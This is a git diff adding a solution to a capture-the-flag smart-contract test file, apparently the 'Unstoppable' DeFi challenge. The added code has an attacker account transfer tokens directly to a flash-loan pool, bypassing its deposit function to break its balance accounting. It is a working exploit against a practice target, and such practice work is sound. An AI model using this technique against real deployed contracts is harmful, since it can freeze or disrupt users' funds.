@@ -40,6 +40,16 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        [deployer, attacker, someUser] = await ethers.getSigners();
+        const balanceBefore = await this.token.balanceOf(this.pool.address)
+        const amountToTransfer = ethers.utils.parseEther("10")
+        // don't need to use approve here because only 2 party involved (user approve + transfer for 3 parties)
+        // await this.token.connect(attacker).approve(attacker.address, amountToTransfer)
+        // await this.token.connect(attacker).transferFrom(attacker.address,this.pool.address, amountToTransfer);
+        await this.token.connect(attacker).transfer(this.pool.address, amountToTransfer);
+
+        const balanceAfter = await this.token.balanceOf(this.pool.address)
+        expect(balanceAfter).to.be.gt(balanceBefore)
     });
 
     after(async function () {
